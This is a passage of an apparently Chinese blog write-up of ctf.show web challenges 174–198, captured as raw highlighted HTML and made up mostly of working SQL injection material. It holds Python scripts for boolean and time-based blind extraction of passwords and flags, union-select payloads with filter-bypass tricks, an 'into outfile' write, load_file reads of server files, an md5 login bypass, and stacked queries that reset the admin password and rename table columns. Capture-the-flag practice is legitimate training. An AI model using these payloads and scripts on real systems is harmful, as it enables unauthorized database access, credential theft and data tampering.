punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user4 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,1,0)"</span></span>        url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://5d04fd50-8b1c-40fc-9f33-520ecb876ab5.challenge.ctf.show/api/v4.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        tex<span class="token operator">=</span>requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>175</strong></p><p>啥都没了时间盲注</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl<span class="token operator">=</span><span class="token string">"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1&amp;page=1&amp;limit=10"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">45</span><span class="token punctuation">,</span> <span class="token number">57</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user5 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(2),0)"</span></span>        url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">97</span><span class="token punctuation">,</span><span class="token number">125</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        sql <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"if(ascii(substr((select password from ctfshow_user5 limit 24,1),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">,sleep(2),0)"</span></span>        url<span class="token operator">=</span><span class="token string-interpolation"><span class="token string">f"http://a5db8e88-69c0-425f-940a-d80b5506cf35.challenge.ctf.show/api/v5.php?id=1'and 1=</span><span class="token interpolation"><span class="token punctuation">&#123;</span>sql<span class="token punctuation">&#125;</span></span><span class="token string">--+&amp;page=1&amp;limit=10"</span></span>        <span class="token keyword">try</span><span class="token punctuation">:</span>            requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span>timeout<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">)</span>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">chr</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">,</span> end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>或者试试文件读写</p><pre class="line-numbers language-none"><code class="language-none">1&#39; union select 1,password from ctfshow_user5 into outfile &#39;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.txt&#39; --+<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>176</strong></p><p>过滤了union select，大小写绕过或万能密码<code>1&#39; or 1=1--+</code></p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_user0&#39; unIon sElEct 1,2,group_concat(password) from ctfshow_web.ctfshow_user --+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><strong>177</strong></p><p>过滤了空格，/**/即可，不能用+，url会被转成空格</p><pre class="line-numbers language-none"><code class="language-none">0&#39;&#x2F;**&#x2F;union&#x2F;**&#x2F;select&#x2F;**&#x2F;1,2,group_concat(password)&#x2F;**&#x2F;from&#x2F;**&#x2F;ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>178</strong></p><p>过滤了空格和*，制表符%09绕过</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%09union%09select%091,2,group_concat(password)%09from%09ctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>179</strong></p><p>%09也没了，还剩%0c</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%0cunion%0cselect%0c1,2,group_concat(password)%0cfrom%0cctfshow_user%23<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>180</strong></p><p>真没招了，看看wp，通过反引号分割，绝</p><pre class="line-numbers language-none"><code class="language-none">0&#39;union%0cselect&#39;1&#39;,(select&#96;password&#96;from&#96;ctfshow_user&#96;where&#96;username&#96;&#x3D;&#39;flag&#39;),&#39;3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>还有</p><pre class="line-numbers language-none"><code class="language-none">0&#39;or(id&#x3D;26)and&#39;1&#39;&#x3D;&#39;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>181</strong></p><p>select不见了，万能密码</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%0cor%0cid&#x3D;&#39;26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>182</strong></p><p>flag不见了，其实不影响上面的，但是还是可以尝试模糊匹配</p><pre class="line-numbers language-none"><code class="language-none">0&#39;%0cor%0cusername%0clike%0c&#39;%fla%<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><strong>183</strong></p><p>使用正则表达式和布尔盲注</p><pre class="line-numbers language-none"><code class="language-none">WHERE email REGEXP &#39;a&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>意思是在email中匹配a的</p><p>写脚本咯</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://24a744c9-dd02-415a-b46b-68e87b328edd.challenge.ctf.show/select-waf.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"(ctfshow_user)where(substr(pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">')"</span></span>        <span class="token punctuation">&#125;</span>        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 1;"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>184</strong></p><p>RIGHT JOIN 关键字会右表 (table_name2) 那里返回所有的行，即使在左表 (table_name1) 中没有匹配的行。</p><pre class="line-numbers language-none"><code class="language-none">SELECT column_name(s)FROM table_name1RIGHT JOIN table_name2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们将匹配后的表作为右表，使用正则查询即可</p><p><code>ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,&#123;i&#125;,1)regexp(char(&#123;ord(j)&#125;)))</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://cf6d0357-c567-4db6-9fab-5827e7d5e40d.challenge.ctf.show/select-waf.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1)regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 43;"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>记得问on是啥意思</p><p><strong>185</strong></p><p>过滤了数字，用true=1相加构造数字咧</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://7cdec59f-0059-4f5d-ac07-fcac41696822.challenge.ctf.show/select-waf.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span><span class="token keyword">def</span> <span class="token function">lo</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>    tmp<span class="token operator">=</span><span class="token string">"true"</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>x<span class="token punctuation">)</span><span class="token punctuation">:</span>        tmp<span class="token operator">=</span>tmp<span class="token operator">+</span><span class="token string">"+true"</span>    <span class="token keyword">return</span> tmp<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'tableName'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>lo<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">),(true))regexp(char(</span><span class="token interpolation"><span class="token punctuation">&#123;</span>lo<span class="token punctuation">(</span><span class="token builtin">ord</span><span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></span><span class="token string">)))"</span></span>        <span class="token punctuation">&#125;</span>        tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token punctuation">.</span>text        <span class="token keyword">if</span> <span class="token string">"$user_count = 43;"</span> <span class="token keyword">in</span> tex<span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>            <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>186</strong></p><p>同上，开打就完了</p><p><strong>187</strong></p><p>针对<code>md5(xxx,true)</code>的绕过：<span class="exturl"><a class="exturl__link"   href="https://blog.csdn.net/solitudi/article/details/107813286?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522160631731619195283021913%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=160631731619195283021913&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_blog_default-1-107813286.pc_v2_rank_blog_default&utm_term=md5%20%20_POST%20%20password%20%20,true&spm=1018.2118.3001.4450" >链接</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p><p>只能寻找md5</p><p>所以密码输入:ffifdyop即可</p><p>进行运算得出的结果为</p><p>‘or’6�]��!r,��b</p><p>由于or后面6为真，所以语句恒为真</p><p><strong>188</strong></p><p>SQL比较真真离谱</p><p>字符串当作数字处理</p><p>即当mysql中字符串与数字做比较的时候，会将字符串当作数字来比较。如123bac会当作123处理。  因此我们在查询的时候即使username=0，也会返回一些以0开头的数据。</p><p>00即可</p><p><strong>189</strong></p><p>空格消失法，提示flag在api/flag.php中，必然要读取文件咯</p><p>尝试用户名发现只有两种回显结果，一种是查询失败，一种是密码错误</p><p>布尔盲注走起</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://36ec0642-dfd4-460f-951d-afbf1887db2c.challenge.ctf.show/api/index.php'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'if(load_file("/var/www/html/api/index.php")regexp(\'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">\'),0,1)#'</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>190</strong></p><p>进行一个布尔的盲注</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://f808d3c6-5e32-4c6c-a217-16eb4cd1c842.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and ((substr((select f1ag from ctfshow_fl0g),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">,1))='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>j<span class="token punctuation">&#125;</span></span><span class="token string">')#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"密码错误"</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>191</strong></p><p>过滤了file|into|ascii上个脚本还能用</p><p><strong>192</strong></p><p>过滤了file|into|ascii|ord|hex继续用</p><p><strong>193</strong></p><p>过滤了file|into|ascii|ord|hex|substr问题不大，换left</p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_flxgcolumn:f1ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://dc60958a-3c76-4425-acf9-cef85100c566.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">r",&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;_"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and (left((select f1ag from ctfshow_flxg),</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">)='</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">')#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"用户名不存在"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>194</strong></p><p>我谢谢你啊left和right都没了</p><p>过滤了file|into|ascii|ord|hex|substr|char|left|right|substring，用like或者正则（其实用mid也行）</p><pre class="line-numbers language-none"><code class="language-none">database:ctfshow_webtable:ctfshow_flxgcolumn:f1ag<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">'http://a0589fee-511c-495e-b8c9-319e9f5cc086.challenge.ctf.show/api/'</span>flagstr <span class="token operator">=</span> <span class="token string">r"&#123;flqazwsxedcrvtgbyhnujmikolp-0123456789&#125;_,"</span>flag<span class="token operator">=</span><span class="token string">''</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1000</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token keyword">for</span> j <span class="token keyword">in</span> flagstr<span class="token punctuation">:</span>tmp<span class="token operator">=</span>flag<span class="token operator">+</span>jdata <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f"admin' and if(((select group_concat(f1ag) from ctfshow_flxg)regexp('</span><span class="token interpolation"><span class="token punctuation">&#123;</span>tmp<span class="token punctuation">&#125;</span></span><span class="token string">')),1,0)#"</span></span><span class="token punctuation">,</span><span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string">'1'</span><span class="token punctuation">,</span><span class="token punctuation">&#125;</span>tex <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">=</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token string">"用户名不存在"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> tex<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token keyword">print</span><span class="token punctuation">(</span>j<span class="token punctuation">,</span>end<span class="token operator">=</span><span class="token string">''</span><span class="token punctuation">)</span>flag<span class="token operator">=</span>flag<span class="token operator">+</span>j<span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>195</strong></p><p>堆叠改密码咯，查询语句中的username没有用引号包裹，所以查询的时候用十六进制转字符串</p><pre class="line-numbers language-none"><code class="language-none">1;update&#96;ctfshow_user&#96;set&#96;pass&#96;&#x3D;0x313131;10x61646d696e111<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>196</strong></p><p>😅</p><p>![](<span class="exturl"><a class="exturl__link"   href="https://jlan-blog.oss-cn-beijing.aliyuncs.com/%E6%88%AA%E5%B1%8F2022-04-10" >https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-10</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> 11.29.32.png)</p><p><strong>197，198</strong></p><p>一个wp脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># @Author:Y4tacker</span><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">"http://b126bc7c-2b32-461d-9520-30d5baf7a152.chall.ctf.show/api/"</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> i <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">:</span>        data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>            <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0;alter table ctfshow_user change column `pass` `ppp` varchar(255);alter table ctfshow_user '</span>                        <span class="token string">'change column `id` `pass` varchar(255);alter table ctfshow_user change column `ppp` `id` '</span>                        <span class="token string">'varchar(255);'</span><span class="token punctuation">,</span>            <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>        <span class="token punctuation">&#125;</span>        r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    data <span class="token operator">=</span> <span class="token punctuation">&#123;</span>        <span class="token string">'username'</span><span class="token punctuation">:</span> <span class="token string">'0x61646d696e'</span><span class="token punctuation">,</span>        <span class="token string">'password'</span><span class="token punctuation">:</span> <span class="token string-interpolation"><span class="token string">f'</span><span class="token interpolation"><span class="token punctuation">&#123;</span>i<span class="token punctuation">&#125;</span></span><span class="token string">'</span></span>    <span class="token punctuation">&#125;</span>    r <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token punctuation">,</span> data<span class="token operator">=</span>data<span class="token punctuation">)</span>    <span class="token keyword">if</span> <span class="token string">"登陆成功"</span> <span class="token keyword">in</span> r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'msg'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" 